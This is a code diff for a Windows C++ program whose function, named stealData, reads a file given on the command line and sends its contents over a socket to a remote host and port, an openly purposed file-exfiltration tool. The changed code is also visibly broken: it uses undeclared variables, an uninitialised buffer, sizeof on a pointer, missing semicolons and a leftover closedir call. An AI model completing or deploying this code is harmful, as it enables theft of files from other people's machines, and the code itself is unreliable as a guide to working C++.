@@ -7,30 +7,32 @@
 #include <WinSock2.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <dirent.h>
 #include <string>
 
 using namespace std;
 
-int stealData(char *fileName)
+int stealData(char *fileName, SOCKET Socket)
 {
-    DIR *dir;
-    struct dirent *ent;
-    if ((dir = opendir(filePath)) != NULL)
+    FILE *fp = fopen(fn, "r");
+    if (fp)
     {
-        while ((ent = readdir(dir)) != NULL)
+        char c;
+        do
         {
-            send(Socket, ent->d_name, sizeof(ent->d_name), 0);
-            send(Socket, "\n", 1, 0);
-            memset(ent->d_name, 0, sizeof(ent->d_name));
-        }
+            int count = 0;
+            char *buff;
+            while (buff < maxBuff && c != EOF)
+            {
+                buff[count++] = c = fgetc(fp);
+            }
+            send(Socket, buff, sizeof(buff), 0);
+        } while (c != EOF);
         closedir(dir);
         return 1;
     }
     else
     {
-        perror("Can't open the file.");
-        return 0;
+        perror("File not found")
     }
 }
 
@@ -42,6 +44,11 @@ int main(int argc, char *args[])
     int port = atoi(args[2]);
     char *filePath = args[3];
 
+    if (fopen(fn, "r") == 0)
+    {
+        perror("File not found")
+            ExitProcess(EXIT_FAILURE);
+    }
     // winsock init
     WSADATA wsaData;
     SOCKADDR_IN addr;
@@ -72,7 +79,7 @@ int main(int argc, char *args[])
     send(Socket, filePath, sizeof(filePath), 0);
     send(Socket, "\n", 1, 0);
 
-    stealData(fileName);
+    stealData(filePath, Socket);
 
     ExitProcess(EXIT_SUCCESS);
 }
